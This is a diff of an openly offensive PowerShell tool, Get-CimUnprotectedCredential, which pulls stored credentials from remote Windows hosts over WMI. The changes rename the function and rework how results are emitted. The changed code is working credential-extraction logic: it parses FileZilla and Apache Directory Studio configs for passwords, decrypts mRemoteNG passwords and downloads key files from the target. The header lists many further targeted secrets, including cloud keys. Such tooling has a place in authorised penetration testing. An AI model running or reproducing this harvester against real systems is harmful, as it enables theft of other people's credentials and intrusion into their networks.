@@ -1,15 +1,15 @@
 #requires -version 3
 
-Function Get-CimCredential {
+Function Get-CimUnprotectedCredential {
 <#
 .SYNOPSIS
-    Grab credentials stored on a remote computer.
+    Grab unprotected credentials stored on a remote computer.
     Privileges required: high
 
     Author: Timothée MENOCHET (@_tmenochet)
 
 .DESCRIPTION
-    Get-CimCredential enumerates registry keys and files containing credentials on a remote host through WMI.
+    Get-CimUnprotectedCredential enumerates registry keys and files containing credentials on a remote host through WMI.
     Credential files can be optionally downloaded via SMB or PowerShell Remoting.
     Gathered credentials include autologon, unattended files, VNC, TeamViewer (CVE-2018-14333), WinSCP, PuTTY, mRemoteNG, Apache Directory Studio, AWS, Azure, Google Cloud Plateform, Bluemix.
 
@@ -32,7 +32,7 @@ Function Get-CimCredential {
     Enables file download, defaults to true.
 
 .EXAMPLE
-    PS C:\> Get-CimCredential -ComputerName SRV.ADATUM.CORP -Credential ADATUM\Administrator -DownloadFiles
+    PS C:\> Get-CimUnprotectedCredential -ComputerName SRV.ADATUM.CORP -Credential ADATUM\Administrator -DownloadFiles
 #>
 
     [CmdletBinding()]
@@ -937,7 +937,6 @@ Function Local:Get-FilezillaCredentialFile {
                         Get-RemoteFile -Path $file.Name -Destination $outputFile -ComputerName $ComputerName -Credential $Credential
                     }
                     # Extract credentials from file
-                    $creds = New-Object Collections.ArrayList
                     $xml = [Xml] (Get-Content $outputFile)
                     if (-not ($sessions = $xml.SelectNodes('//FileZilla3/Servers/Server')).Count) {
                         $sessions = $xml.SelectNodes('//FileZilla3/RecentServers/Server')
@@ -950,19 +949,19 @@ Function Local:Get-FilezillaCredentialFile {
                             $password = $session.Pass.InnerText
                         }
                         if ($password -or ($keyFile = $session.KeyFile)) {
-                            $cred = @{}
-                            $cred["Username"] = $session.User
-                            $cred["Password"] = $password
-                            $cred["Hostname"] = $session.Host
-                            $cred["Port"] = $session.Port
-                            $cred["Protocol"] = $session.Protocol
+                            $creds = @{}
+                            $creds["Username"] = $session.User
+                            $creds["Password"] = $password
+                            $creds["Hostname"] = $session.Host
+                            $creds["Port"] = $session.Port
+                            $creds["Protocol"] = $session.Protocol
 
                             if ($keyFile) {
                                 # Download key file
                                 $keyFilePath = $keyFile.Replace('\','\\')
                                 $file = Get-CimInstance -ClassName CIM_LogicalFile -Filter "Name='$keyFilePath'" -CimSession $cimSession -Verbose:$false
                                 if ($file.Name) {
-                                    $cred["KeyFile"] = $keyFile
+                                    $creds["KeyFile"] = $keyFile
                                     $outputDir = "$PWD\$ComputerName"
                                     $outputFile = "$outputDir\$($temp.Get($temp.Count - 1))_$($file.FileName).$($file.Extension)"
                                     New-Item -ItemType Directory -Force -Path $outputDir | Out-Null
@@ -974,12 +973,10 @@ Function Local:Get-FilezillaCredentialFile {
                                     }
                                 }
                             }
-                            $creds.Add((New-Object PSObject -Property $cred)) | Out-Null
+                            $r = $result.PsObject.Copy()
+                            $r | Add-Member -MemberType NoteProperty -Name 'Credentials' -Value (New-Object PSObject -Property $creds)
+                            Write-Output $r
                         }
-                    }
-                    if ($creds.Count -gt 0) {
-                        $result | Add-Member -MemberType NoteProperty -Name 'Credentials' -Value $creds
-                        Write-Output $result
                     }
                 }
                 else {
@@ -1020,14 +1017,14 @@ Function Local:Get-MRNGCredentialFile {
             $Node.ChildNodes | ForEach-Object {
                 if ($_.Type -eq 'Connection' -and $_.Password) {
                     $password =  ConvertFrom-MRNGSecureString -EncryptedMessage $_.Password
-                    $cred = @{}
-                    $cred["Domain"] = $_.Domain
-                    $cred["Username"] = $_.Username
-                    $cred["Password"] = $password
-                    $cred["Hostname"] = $_.Hostname
-                    $cred["Port"] = $_.Port
-                    $cred["Protocol"] = $_.Protocol
-                    return (New-Object PSObject -Property $cred)
+                    $creds = @{}
+                    $creds["Domain"] = $_.Domain
+                    $creds["Username"] = $_.Username
+                    $creds["Password"] = $password
+                    $creds["Hostname"] = $_.Hostname
+                    $creds["Port"] = $_.Port
+                    $creds["Protocol"] = $_.Protocol
+                    return (New-Object PSObject -Property $creds)
                 }
                 elseif ($_.Type -eq 'Container') {
                     Get-MRNGCredential $_
@@ -1135,16 +1132,13 @@ Function Local:Get-MRNGCredentialFile {
                     $nsm.AddNamespace('mrng', 'http://mremoteng.org')
                     $nodes = $xml.SelectNodes('//mrng:Connections', $nsm)
                 }
-                $creds = New-Object Collections.ArrayList
                 foreach($node in $nodes) {
-                    $cred = Get-MRNGCredential $node
-                    foreach ($c in $cred) {
-                        $creds.Add(($c)) | Out-Null
+                    $creds = Get-MRNGCredential $node
+                    foreach ($cred in $creds) {
+                        $r = $result.PsObject.Copy()
+                        $r | Add-Member -MemberType NoteProperty -Name 'Credentials' -Value $cred
+                        Write-Output $r
                     }
-                }
-                if ($creds.Count -gt 0) {
-                    $result | Add-Member -MemberType NoteProperty -Name 'Credentials' -Value $creds
-                    Write-Output $result
                 }
             }
             else {
@@ -1209,23 +1203,20 @@ Function Local:Get-ApacheDirectoryStudioCredentialFile {
                 # Extract credentials from file
                 $xml = [Xml] (Get-Content $outputFile)
                 $nodes = $xml.SelectNodes('//connections')
-                $creds = New-Object Collections.ArrayList
                 foreach($node in $nodes) {
                     $node.ChildNodes | ForEach-Object {
                         if ($_.bindPassword) {
-                            $cred = @{}
-                            $cred["Username"] = $_.bindPrincipal
-                            $cred["Password"] = $_.bindPassword
-                            $cred["Hostname"] = $_.host
-                            $cred["Port"] = $_.port
-                            $cred["Protocol"] = 'LDAP'
-                            $creds.Add((New-Object PSObject -Property $cred)) | Out-Null
+                            $creds = @{}
+                            $creds["Username"] = $_.bindPrincipal
+                            $creds["Password"] = $_.bindPassword
+                            $creds["Hostname"] = $_.host
+                            $creds["Port"] = $_.port
+                            $creds["Protocol"] = 'LDAP'
+                            $r = $result.PsObject.Copy()
+                            $r | Add-Member -MemberType NoteProperty -Name 'Credentials' -Value (New-Object PSObject -Property $creds)
+                            Write-Output $r
                         }
                     }
-                }
-                if ($creds.Count -gt 0) {
-                    $result | Add-Member -MemberType NoteProperty -Name 'Credentials' -Value $creds
-                    Write-Output $result
                 }
             }
             else {
